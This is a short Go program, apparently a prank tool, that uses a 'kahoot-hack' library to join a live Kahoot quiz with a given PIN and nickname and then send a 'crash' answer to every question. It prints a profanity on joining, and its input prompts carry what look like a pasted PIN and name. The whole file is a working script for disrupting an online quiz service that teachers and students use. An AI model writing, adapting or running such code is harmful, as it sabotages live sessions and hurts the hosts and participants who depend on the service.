package main

import (
	"fmt"
	"github.com/unixpickle/kahoot-hack/kahoot"
	"os"
)

func main() {
	var pin string
	var nickname string
	fmt.Print("77926: ")
	fmt.Scanln(&pin)
	fmt.Print("Morten: ")
	fmt.Scanln(&nickname)
	fmt.Println("FuckYou...")
	conn, err := kahoot.NewConnection(pin)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
	if err := conn.Register(nickname); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println("Awaiting questions...")
	for {
		if conn.WaitQuestion() != nil {
			fmt.Println("Done question loop:", err)
			os.Exit(1)
		}
		fmt.Println("CRASHING!")
		conn.SendCrashAnswer()
	}
}
